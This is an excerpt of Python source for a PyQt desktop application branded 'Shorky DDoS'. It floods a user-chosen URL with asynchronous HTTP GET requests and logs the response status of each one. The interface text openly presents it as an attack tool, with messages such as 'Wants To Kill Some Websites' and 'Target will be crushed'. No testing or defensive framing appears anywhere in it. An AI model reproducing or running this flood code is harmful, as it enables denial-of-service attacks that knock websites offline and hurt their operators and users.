    ...
    async def send_request(self, session, ip_address):
        ...
        try:
            async with session.get(self.target_url, headers=headers, timeout=2) as response:
                self.log_signal.emit(f"Shorkyyy@Shorky's PC -> {self.target_url} with IP: {ip_address} - Status: {response.status}")
        except Exception:
            pass  
...
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Shorky Stress !")
        ...
        image_url = "https://wallpapers-clan.com/wp-content/uploads/2024/04/cute-anime-girl-in-shark-costume-desktop-wallpaper-preview.jpg"
        
        self.load_image(image_url)

        slogan_label = QLabel("Shorky DDoS Wants To Kill Some Websites ")
    ...
    def start_attack(self):
        ...
        try:
            ...
            QMessageBox.critical(self, "Shorky", "Number of requests must be an integer!")
            return

        if not target_url or num_requests <= 0:
            QMessageBox.critical(self, "Shorky", "Enter a valid URL and number of requests!")
            return

        self.log_message("DDoS attack started. Target will be crushed by shorky's power!")

        self.attack_thread = AttackThread(target_url, num_requests)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.start()
        QMessageBox.information(self, "Shorky", "Attack has begun! Check the logs, Rawr!")
